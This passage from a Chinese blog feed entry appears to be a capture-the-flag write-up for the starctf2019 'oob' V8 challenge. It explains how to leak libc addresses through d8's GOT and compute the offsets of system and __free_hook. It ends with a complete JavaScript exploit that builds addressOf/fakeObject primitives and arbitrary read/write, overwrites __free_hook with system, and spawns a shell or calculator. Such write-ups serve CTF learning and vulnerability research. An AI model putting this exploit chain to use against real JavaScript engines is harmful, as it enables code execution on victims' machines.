href="#获取d8-got-libc-start-main-addr" class="headerlink" title="获取d8_got_libc_start_main_addr"></a>获取d8_got_libc_start_main_addr</h4><p>ida查看.got的偏移，这里是0x12a47b0</p><h4 id="获取libc-start-main-addr"><a href="#获取libc-start-main-addr" class="headerlink" title="获取libc_start_main_addr"></a><img src="/2021/04/21/starctf2019-oob/image-20210104201218775.png" alt="image-20210104201218775">获取libc_start_main_addr</h4><p><img src="/2021/04/21/starctf2019-oob/image-20210104201103483.png" alt="image-20210104201103483"></p><p><img src="/2021/04/21/starctf2019-oob/image-20210104201129304.png" alt="image-20210104201129304"></p><h4 id="获取libc-base-addr"><a href="#获取libc-base-addr" class="headerlink" title="获取libc_base_addr"></a>获取libc_base_addr</h4><p>libc的基址可以通过泄露的libc_start_main与偏移进行计算，我们在此次执行中可以知道0x00007f6e88df3fc0是libc_start_main在libc中的地址，0x7f6e88dcd000是libc基址，所以这里的偏移为0x26fc0</p><h4 id="获取libc-system-addr和libc-free-hook-addr"><a href="#获取libc-system-addr和libc-free-hook-addr" class="headerlink" title="获取libc_system_addr和libc_free_hook_addr"></a><img src="/2021/04/21/starctf2019-oob/image-20210104202359104.png" alt="image-20210104202359104">获取libc_system_addr和libc_free_hook_addr</h4><p>ida查看下libc文件，可以看出__libc_start_main确实是在libc基址偏移0x26fc0</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104202851003.png" alt="image-20210104202851003"></p><p>所以我们可以直接通过查看ida来确定system和free_hook的偏移，可以看出来分别为0x55410，0x1eeb28</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104203218607.png" alt="image-20210104203218607"></p><p><img src="/2021/04/21/starctf2019-oob/image-20210105091543768.png" alt="image-20210105091543768"></p><p>也可以通过gdb中泄露函数或者全局变量的地址，再通过与libc基址相减，即可得到相对应的偏移</p><p><img src="/2021/04/21/starctf2019-oob/image-20210105092417427.png" alt="image-20210105092417427"></p><p>最后申请一个变量在进行释放，触发free操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x0068732f6e69622fn</span>)); <span class="comment">// str --&gt; /bin/sh\x00 </span></span><br><span class="line">&#125;</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="/2021/04/21/starctf2019-oob/image-20210105092756824.png" alt="image-20210105092756824"></p><p>也可以发送弹出计算器的命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    <span class="comment">//get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\x00 </span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x69622fn</span>), <span class="literal">true</span>); <span class="comment">// /snap/bi</span></span><br><span class="line"> get_shell_dataview.setFloat64(<span class="number">3</span>, i2f(<span class="number">0x2d656d6f6e672f6en</span>), <span class="literal">true</span>); <span class="comment">// n/gnome-</span></span><br><span class="line"> get_shell_dataview.setFloat64(<span class="number">11</span>, i2f(<span class="number">0x74616c75636c6163n</span>), <span class="literal">true</span>); <span class="comment">// calculat</span></span><br><span class="line"> get_shell_dataview.setFloat64(<span class="number">19</span>, i2f(<span class="number">0x726fn</span>), <span class="literal">true</span>); <span class="comment">// or</span></span><br><span class="line">&#125;</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure><p><img src="/2021/04/21/starctf2019-oob/image-20210105093339083.png" alt="image-20210105093339083"></p><h3 id="完整exp如下-1"><a href="#完整exp如下-1" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将某个addr强制转换为object对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);</span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64_dataview</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setFloat64(<span class="number">0</span>, i2f(data), <span class="literal">true</span>);</span><br><span class="line">   <span class="comment">// %SystemBreak();</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = read64(code_addr + <span class="number">0x41n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc leak_d8_addr: 0x&quot;</span> + hex(leak_d8_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr -<span class="number">0xfc8780n</span>;<span class="comment">//本人的libc版本是libc-2.31.so，具体的偏移需要根据自己的libc版本来确定</span></span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0x12a47b0n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = read64(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x00000000001EEB28n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + hex(libc_free_hook_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//write64(libc_free_hook_addr, libc_system_addr);</span></span><br><span class="line">write64_dataview(libc_free_hook_addr, libc_system_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    <span class="comment">//get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\x00</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x69622fn</span>), <span class="literal">true</span>); <span class="comment">// /snap/bi</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">3</span>, i2f(<span class="number">0x2d656d6f6e672f6en</span>), <span class="literal">true</span>); <span class="comment">// n/gnome-</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">11</span>, i2f(<span class="number">0x74616c75636c6163n</span>), <span class="literal">true</span>); <span class="comment">// calculat</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">19</span>, i2f(<span class="number">0x726fn</span>), <span class="literal">true</span>); <span class="comment">// or</span></span><br><span class="line">&#125;</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://www.freebuf.com/news/203721.html" >https://www.freebuf.com/news/203721.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;starctf2019-oob&quot;&gt;&lt;a href=&quot;#starctf2019-oob&quot; class=&quot;headerlink&quot; title=&quot;starctf2019-oob&quot;&gt;&lt;/a&gt;starctf2019-oob&lt;/h1&gt;&lt;h2 id=&quot;1、环境复现&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="浏览器" scheme="https://fa1lr4in.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
